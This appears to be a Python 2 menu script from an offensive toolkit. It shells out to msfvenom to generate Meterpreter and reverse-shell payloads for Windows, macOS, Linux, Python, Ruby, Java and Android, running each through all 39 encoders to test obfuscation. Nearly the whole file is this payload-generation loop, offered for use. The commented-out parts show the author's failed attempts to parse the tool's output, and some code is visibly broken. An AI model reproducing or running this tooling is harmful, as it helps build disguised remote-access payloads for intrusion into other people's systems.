#!/usr/bin/env python
# coding=UTF-8

#The first line allows this script to be executable
#Startup Module Imports
import os
import socket
import operator
from termcolor import colored
import sys
import time
import StringIO
import subprocess
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

text_Starting = colored('[*] Beginning tests against all 39 encoders','yellow',attrs=['bold'])
text_Finished = colored('[*] Encoder tests completed, please check console output','green',attrs=['bold'])
text_Successful = colored('[+] Successful Encoding Detected','green',attrs=['bold'])
encoder_test_results = '/root/ArmsCommander/payloads/encoder_test_results.txt'

# #def #write_encoder_success_file():
#     f = open(encoder_test_results,'w')
#     # f.write(sys.__stdout__)
#     # sys.__stdout__.write(f)
#     f.write(sys.__stdout__)
#     f.close()
#     return
def check_encoder_success(): # this function is not working. Check my commented out notes below
# main reason this wont work, is that the msfvenom is under 'file msfvenom':
# msfvenom: a /usr/share/metasploit-framework/ruby script, ASCII text executable
# That means it will not output to a readable text file with '>>' command.
# the terminal command for msfvenom is located at /usr/bin/msfvenom
# it is not a normal binary file, its a symbolic link to the ruby script
# furthermore there is poor documentation for check_output python command
# oh this explains alot. And I do not know ruby
# http://stackoverflow.com/questions/6671716/what-is-the-difference-between-rubys-stdout-and-stdout
# So basically
# You cannot use '>>'
# YOu cannot use write to __stdout__
# YOu cannot use stdout.check_output
# Only possible way since none of it is accessible is...
# Just read the successful output when running the encoder tester
    test_results = open(encoder_test_results,'r')
    buf = StringIO.StringIO(test_results)
    while True:
        line = buf.readline().strip()
        if line == "succeeded":
            print colored('[+] '+line,'green',attrs=['bold'])

# study of the /usr/share/metasploit-framework/msfvenom file:
#     The output stream is:
#     else
#   output_stream = $stdout
#   output_stream.binmode
#   output_stream.write payload
#   # trailing newline for pretty output
#   $stderr.puts unless payload =~ /\n$/
# end
#
# I want to get this working and be able to read stdout and then use check_output to show neatly to the user which encoders worked
# However, StackOverflow sucks, and the Python Documentation sucks more
#
# The problem is that msfvenom uses some unusual method to output terminal output.
# Also you cannot run the ">>" command to a text file, it outputs gibberish.
# def ##check_encoder_success():
#     try:
#         console_output = (subprocess.check_output(cmd_String,shell=True)).strip()
#     except:
#
#     with open(console_output,'r') as f:
#         output_check = f.read()
#
#     return


# or a new method.
# Why not just stdout the results to a freaking text file?


### All of the commented lines below are the trash answers I found on StackOverflow, there appears to be no credible documentation on subprocess.check_output
### Its better to read the source code from a different program and see if they came up with an answer

### Here is a good example /usr/share/veil-evasion/modules/common/patch.py
### Line #12, the headerPatch() function
### Looks for a file called 'metsrv.x86.dll'
### Using the Try, Except, Commands
### If successful, then it appears to be performing some sort of DLL reflective injection of shellcode
### If not, then it alerts the user to update their metasploit installation
#
# The command is:
# variable = (subprocess.check_output("find command" + directory + " -iname " + file, shell=True)).strip() # not sure why he did the last strip part unless the slashes causes errors
# if it finds a line of the Metersploit shellcode///
# it then adds additional lines of shellcode
### All of the commented lines below are the trash answers I found on StackOverflow, there appears to be no credible documentation on subprocess.check_output
### Its better to read the source code from a different program and see if they came up with an answer
# def ##check_encoder_success():
#     subprocess.check_output([cmd_String, 'succeeded', check=True])
#         print text_Successful
#
#     return
#
# # read terminal output, if it "succeeded with size"
# print a alert that encoding succeeded
# sample python interpreter output from StackOverflow
# >>> import subprocess
# >>> cmd = [ 'echo', 'arg1', 'arg2' ]
# >>> output = subprocess.Popen( cmd, stdout=subprocess.PIPE ).communicate()[0]
# >>> print output
# arg1 arg2
# def ##check_encoder_success(): # Okay StackOverflow cant answer shit for a question
#     # process = subprocess.Popen(['bash'])
#     # subprocess.check_output("succeeded with size",subprocess.STDOUT,shell=True) #subprocess.CalledProcessError: Command 'succeeded with size' returned non-zero exit status 127
#
#     # cmd = ['succeeded with size']
#     # output = subprocess.Popen(cmd,stdout=subprocess.PIPE).communicate()[0]
#     mainProcess = subprocess.Popen(['python'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
#     communicateRes = mainProcess.communicate()
#     stdOutValue, stdErrValue = communicateRes
#
#     # you can split by any value, here is by space
#     my_output_list = stdOutValue.split(" ")
#
#     # after the split we have a list of string in my_output_list
#     for word in my_output_list :
#         if word == "succeeded":
#             text = colored('[+] Successful encoding detected','green',attrs=['bold'])
#             print text
#         else:
#             pass
#     subprocess.check_output("succeeded",stdout=subprocess.PIPE,stderr=subprocess.PIPE)
#     return


encoder_Dict = {
    '1': 'cmd/echo',
    '2': 'cmd/generic_sh',
    '3': 'cmd/ifs',
    '4': 'cmd/perl',
    '5': 'cmd/powershell_base64',
    '6': 'cmd/printf_php_mq',
    '7': 'generic/eicar',
    '8': 'generic/none',
    '9': 'mipsbe/byte_xori',
    '10': 'mipsbe/longxor',
    '11': 'mipsle/byte_xori',
    '12': 'mipsle/longxor',
    '13': 'php/base64',
    '14': 'ppc/longxor',
    '15': 'ppc/longxor_tag',
    '16': 'sparc/longxor_tag',
    '17': 'x64/xor',
    '18': 'x64/zutto_dekiru',
    '19': 'x86/add_sub',
    '20': 'x86/alpha_mixed',
    '21': 'x86/alpha_upper',
    '23': 'x86/avoid_underscore_tolower',
    '22': 'x86/avoid_utf8_tolower',
    '24': 'x86/bloxor',
    '25': 'x86/bmp_polyglot',
    '26': 'x86/call4_dword_xor',
    '28': 'x86/context_cpuid',
    '27': 'x86/context_stat',
    '29': 'x86/context_time',
    '30': 'x86/countdown',
    '31': 'x86/fnstenv_mov',
    '32': 'x86/jmp_call_additive',
    '33': 'x86/nonalpha',
    '34': 'x86/nonupper',
    '35': 'x86/opt_sub',
    '36': 'x86/shikata_ga_nai',
    '37': 'x86/single_static_bit',
    '38': 'x86/unicode_mixed',
    '39': 'x86/unicode_upper'
}
def Windows_INLINE():
        opt_Dict = {
            '1': 'windows/meterpreter_reverse_tcp',
            '2': 'windows/meterpreter_reverse_http',
            '3': 'windows/meterpreter_reverse_https'
        }
        opt_List = (
            '\n\t#1. Windows Meterpreter, Reverse TCP Shell',
            '#2. Windows Meterpreter, Reverse HTTP Shell',
            '#3. Windows Meterpreter, Reverse HTTPS Shell'
        )
        print ("\n\t".join(opt_List))
        opt_Choice = str(raw_input("Enter a payload shown: "))

        if opt_Choice in opt_Dict:
            # os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
            # print colored('Please answer the following questions','red','on_white')
            print text_Starting
            payload_Set = opt_Dict[opt_Choice]
            bad_Bytes = "x00"
            for key in encoder_Dict:
                encoder_Set = encoder_Dict[key]
                encoder_Iterations = '1'
                cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/ArmsCommander/Encoder_Tested
                """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
                text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
                print text
                os.system(cmd_String)
                #write_encoder_success_file()
                #os.system(cmd_String + ' >> ' + encoder_test_results)
            ##check_encoder_success()
            print text_Finished

        else:
            print colored('You have entered a invalid option','red','on_white')
            Windows_INLINE()
        main()
def Windows_STAGED():
        opt_Dict = {
            '1': 'windows/meterpreter/reverse_tcp',
            '2': 'windows/meterpreter/reverse_http',
            '3': 'windows/meterpreter/reverse_https'
        }

        opt_List = (
            '\n\t#1. Windows Meterpreter, Reverse TCP Shell',
            '#2. Windows Meterpreter, Reverse HTTP Shell',
            '#3. Windows Meterpreter, Reverse HTTPS Shell'
        )
        print ("\n\t".join(opt_List))
        opt_Choice = str(raw_input("Enter a payload shown: "))

        if opt_Choice in opt_Dict:
            # os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
            # print colored('Please answer the following questions','red','on_white')
            print text_Starting
            payload_Set = opt_Dict[opt_Choice]
            bad_Bytes = "x00"
            for key in encoder_Dict:
                encoder_Set = encoder_Dict[key]
                encoder_Iterations = '1'
                cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/ArmsCommander/Encoder_Tested
                """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
                text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
                print text
                os.system(cmd_String)
                #os.system(cmd_String + ' >> ' + encoder_test_results)

            ##check_encoder_success()
            text_Finished = colored('[*]Encoder tests completed, please check console output','green',attrs=['bold'])
            print text_Finished

        else:
            print colored('You have entered a invalid option','red','on_white')
            Windows_STAGED()
        main()
def Platform_Windows():
    opt_List = [
        '#0. Return to Main Menu',
        '#1. INLINE/STAGELESS Payloads',
        '#2. STAGED Payloads'
    ]

    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a OPTION:"))

    if opt_Choice == "0":
        main()
    elif opt_Choice == "1":
        Windows_INLINE()
    elif opt_Choice == "2":
        Windows_STAGED()
    else:
        print colored('You have entered a invalid option','red','on_white')
        Platform_Windows()
    return
def OSX_PPC():

    opt_Dict = {
        '1': 'osx/ppc/shell/reverse_tcp',
        '2': 'osx/ppc/shell_reverse_tcp',
    }

    opt_List = (
            '\n\t#1. PowerPC Command Shell STAGED',
            '#2. PowerPC Command Shell INLINE'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))
    if opt_Choice in opt_Dict:
        # os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        # print colored('Please answer the following questions','red','on_white')
        text_Starting = colored('[*] Beginning tests against all 39 encoders','yellow',attrs=['bold'])
        print text_Starting
        payload_Set = opt_Dict[opt_Choice]
        bad_Bytes = "x00"
        for key in encoder_Dict:
            encoder_Set = encoder_Dict[key]
            encoder_Iterations = '1'
            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/ArmsCommander/Encoder_Tested
            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
            text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
            print text
            os.system(cmd_String)
            #os.system(cmd_String + ' >> ' + encoder_test_results)

        text_Finished = colored('[*]Encoder tests completed, please check console output','green',attrs=['bold'])
        print text_Finished

    else:
        print colored('You have entered a invalid option','red','on_white')
        OSX_PPC()
def OSX_x86():
    opt_Dict = {
        '1': 'osx/x86/shell_reverse_tcp',
        '2': 'osx/x86/vforkshell_reverse_tcp',
        '3': 'osx/x86/vforkshell/reverse_tcp'
    }

    opt_List = (
        '\n\t#1. x86/x64 Command Shell Reverse TCP, INLINE',
        '#2. x86/x64 V-Fork Command Shell, Reverse TCP, INLINE',
        '#3. x86/x64 V-Fork Command Shell, Reverse TCP, STAGED'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))
    if opt_Choice in opt_Dict:
        # os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        # print colored('Please answer the following questions','red','on_white')
        text_Starting = colored('[*] Beginning tests against all 39 encoders','yellow',attrs=['bold'])
        print text_Starting
        payload_Set = opt_Dict[opt_Choice]
        bad_Bytes = "x00"
        for key in encoder_Dict:
            encoder_Set = encoder_Dict[key]
            encoder_Iterations = '1'
            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/ArmsCommander/Encoder_Tested
            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
            text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
            print text
            os.system(cmd_String)
            #os.system(cmd_String + ' >> ' + encoder_test_results)

        text_Finished = colored('[*]Encoder tests completed, please check console output','green',attrs=['bold'])
        print text_Finished

    else:
        print colored('You have entered a invalid option','red','on_white')
        OSX_x86()
def Platform_OSX():
    print colored('Mac OSX Shells are COMMAND-SHELL ONLY (No Meterpreter RATs), but you also have to pick what processor architecture you are targeting','red','on_white')
    opt_List = [
        '\n\t#0. Return to Main Menu',
        '#1. Mac OSX PowerPC',
        '#2. Mac OSX x86'
    ]


    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Select a OPTION: "))

    if opt_Choice == "0":
        main()
    elif opt_Choice == "1":
        OSX_PPC()
    elif opt_Choice == "2":
        OSX_x86()
    else:
        print colored('You have entered a invalid option','red','on_white')
        main()

def Linux_STAGED():
#2. Linux Reverse Shells
        #1. Linux Meterpreter Reverse TCP, Staged

    opt_Dict = {
        '1': 'linux/x86/meterpreter/reverse_tcp'
    }

    opt_Choice = str(raw_input("Press 1 to create a reverse meterpreter TCP payload: "))
    if opt_Choice in opt_Dict:
        # os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        # print colored('Please answer the following questions','red','on_white')
        print text_Starting
        payload_Set = opt_Dict[opt_Choice]
        bad_Bytes = "x00"
        for key in encoder_Dict:
            encoder_Set = encoder_Dict[key]
            encoder_Iterations = '1'
            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/ArmsCommander/Encoder_Tested
            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
            text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
            print text
            os.system(cmd_String)
            #os.system(cmd_String + ' >> ' + encoder_test_results)

        print text_Finished
def Platform_Linux():
    print colored('Only staged payloads are available for Linux, press 1 to continue','red','on_white')
    opt_Choice = str(raw_input("Press 1 to CONTINUE: "))
    if opt_Choice == "1":
        Linux_STAGED()
    else:
        print colored('You have entered a invalid option','red','on_white')
        main()
    return
def Python_INLINE():
    opt_Dict = {
        '1': 'python/meterpreter_reverse_tcp',
        '2': 'python/meterpreter_reverse_http',
        '3': 'python/meterpreter_reverse_https'
    }

    opt_List = (
        '\n\t#1. Python Meterpreter Reverse TCP',
        '#2. Python Meterpreter Reverse HTTP',
        '#3. Python Meterpreter Reverse HTTPS'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))
    if opt_Choice in opt_Dict:
        # os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        # print colored('Please answer the following questions','red','on_white')
        print text_Starting
        payload_Set = opt_Dict[opt_Choice]
        bad_Bytes = "x00"
        for key in encoder_Dict:
            encoder_Set = encoder_Dict[key]
            encoder_Iterations = '1'
            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/ArmsCommander/Encoder_Tested
            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
            text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
            print text
            os.system(cmd_String)
            #os.system(cmd_String + ' >> ' + encoder_test_results)

        print text_Finished
def Python_STAGED():
    opt_Dict = {
        '1': 'python/meterpreter/reverse_tcp',
        '2': 'python/meterpreter/reverse_http',
        '3': 'python/meterpreter/reverse_https'
    }

    opt_List = (
        '\n\t#1. Python Meterpreter Reverse TCP',
        '#2. Python Meterpreter Reverse HTTP',
        '#3. Python Meterpreter Reverse HTTPS'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))
    if opt_Choice in opt_Dict:
        # os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        # print colored('Please answer the following questions','red','on_white')
        print text_Starting
        payload_Set = opt_Dict[opt_Choice]
        bad_Bytes = "x00"
        for key in encoder_Dict:
            encoder_Set = encoder_Dict[key]
            encoder_Iterations = '1'
            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/ArmsCommander/Encoder_Tested
            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
            text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
            print text
            os.system(cmd_String)
            #os.system(cmd_String + ' >> ' + encoder_test_results)

        print text_Finished
def Platform_Python():
    opt_List = [
        '\n\t#1. Python INLINE Reverse Meterpreter Shells',
        '#2. Python STAGED Reverse Meterpreter Shells'
    ]

    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "1":
        Python_INLINE()
    elif opt_Choice == "2":
        Python_STAGED()
    elif opt_Choice == "0":
        main()
    else:
        print colored('You have entered a invalid option','red','on_white')
        Platform_Python()

    return
def Ruby_INLINE():
    opt_Dict = {
        '1': 'ruby/shell_reverse_tcp',
        '2': 'ruby/shell_reverse_tcp_ssl'
    }

    opt_List = (
        '\n\t#1. Ruby Reverse COMMAND Shell, TCP',
        '#2. Ruby Reverse COMMAND Shell, TCP + SSL'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))
    if opt_Choice in opt_Dict:
        # os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        # print colored('Please answer the following questions','red','on_white')
        print text_Starting
        payload_Set = opt_Dict[opt_Choice]
        bad_Bytes = "x00"
        for key in encoder_Dict:
            encoder_Set = encoder_Dict[key]
            encoder_Iterations = '1'
            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/ArmsCommander/Encoder_Tested
            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
            text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
            print text
            os.system(cmd_String)
            #os.system(cmd_String + ' >> ' + encoder_test_results)

        print text_Finished

def Platform_Ruby():
#5. Ruby Reverse Shells
    ##INLINE ONLY
        #1. Reverse TCP Command Shells
        #2. Reverse TCP SSL Command Shell
    print colored('Ruby Shells are both INLINE-ONLY and are COMMAND SHELLS (No Meterpreter)','red','on_white')
    Ruby_INLINE()

    return

def Java_STAGED():
    opt_Dict = {
        '1': 'java/meterpreter/reverse_tcp',
        '2': 'java/meterpreter/reverse_http',
        '3': 'java/meterpreter/reverse_https'
    }

    opt_List = (
        '\n\t#1. Java Reverse Meterpreter, TCP',
        '#2. Java Reverse Meterpreter, HTTP',
        '#3. Java Reverse Meterpreter, HTTPS'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))
    if opt_Choice in opt_Dict:
        # os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        # print colored('Please answer the following questions','red','on_white')
        print text_Starting
        payload_Set = opt_Dict[opt_Choice]
        bad_Bytes = "x00"
        for key in encoder_Dict:
            encoder_Set = encoder_Dict[key]
            encoder_Iterations = '1'
            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/ArmsCommander/Encoder_Tested
            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
            text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
            print text
            os.system(cmd_String)
            #os.system(cmd_String + ' >> ' + encoder_test_results)

        print text_Finished
def Platform_Java():
    print colored('Java Meterpreter Shells are STAGED ONLY','red','on_white')
    Java_STAGED()


    return
def Android_INLINE():
    opt_Dict = {
        '1': 'android/meterpreter_reverse_tcp ',
        '2': 'android/meterpreter_reverse_http',
        '3': 'android/meterpreter_reverse_https'
    }

    opt_List = (
        '\n\t#1. Android APK Meterpreter Shell, Reverse TCP',
        '#2. Android APK Meterpreter Shell, Reverse HTTP',
        '#3. Android APK Meterpreter Shell, Reverse HTTPS'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))
    if opt_Choice in opt_Dict:
        # os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        # print colored('Please answer the following questions','red','on_white')
        print text_Starting
        payload_Set = opt_Dict[opt_Choice]
        bad_Bytes = "x00"
        for key in encoder_Dict:
            encoder_Set = encoder_Dict[key]
            encoder_Iterations = '1'
            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/ArmsCommander/Encoder_Tested
            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
            text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
            print text
            os.system(cmd_String)
            #os.system(cmd_String + ' >> ' + encoder_test_results)

def Android_STAGED():
    opt_Dict = {
        '1': 'android/meterpreter/reverse_tcp ',
        '2': 'android/meterpreter/reverse_http',
        '3': 'android/meterpreter/reverse_https'
    }

    opt_List = (
        '\n\t#1. Android APK Meterpreter Shell, Reverse TCP',
        '#2. Android APK Meterpreter Shell, Reverse HTTP',
        '#3. Android APK Meterpreter Shell, Reverse HTTPS'
    )
    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a payload shown: "))
    if opt_Choice in opt_Dict:
        # os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        # print colored('Please answer the following questions','red','on_white')
        print text_Starting
        payload_Set = opt_Dict[opt_Choice]
        bad_Bytes = "x00"
        for key in encoder_Dict:
            encoder_Set = encoder_Dict[key]
            encoder_Iterations = '1'
            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/ArmsCommander/Encoder_Tested
            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
            text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
            print text
            os.system(cmd_String)
            #os.system(cmd_String + ' >> ' + encoder_test_results)

def Platform_Android():
    opt_List = [
    '\n\t#0. Return to Main Menu',
    '#1. Android INLINE Meterpreter Reverse Shells',
    '#2. Android STAGED Meterpreter Reverse Shells'
    ]

    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "0":
        main()
    elif opt_Choice == "1":
        Android_INLINE()
    elif opt_Choice == "2":
        Android_STAGED()
    else:
        print colored('You have entered a invalid option','red','on_white')
        Platform_Android()

    return

def main():
    text = colored('ENCODER TESTING MODE','cyan',attrs=['bold'])
    print text

    opt_List = [
        '\n\t#0. Return to Main Menu',
        '#1. Windows Reverse Shells',
        '#2. Mac OSX Reverse Shells',
        '#3. Linux Reverse Shells',
        '#4. Python Reverse Shells',
        '#5. Ruby Reverse Shells',
        '#6. Java Reverse Shells',
        '#7. Android Reverse Shells'
    ]

    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a category of payloads you want to test: "))

    if opt_Choice == "0":
        os.system('python /root/ArmsCommander/remoteexploits/EZPZ.py')
    elif opt_Choice == "1":
        os.system('clear')
        Platform_Windows()
    elif opt_Choice == "2":
        os.system('clear')
        Platform_OSX()
    elif opt_Choice == "3":
        os.system('clear')
        Platform_Linux()
    elif opt_Choice == "4":
        os.system('clear')
        Platform_Python()
    elif opt_Choice == "5":
        os.system('clear')
        Platform_Ruby()
        return
    elif opt_Choice == "6":
        os.system('clear')
        Platform_Java()
        return
    elif opt_Choice == "7":
        os.system('clear')
        Platform_Android()
        return
    else:
        print 'You have entered a invalid option'
        main()

    return
main()
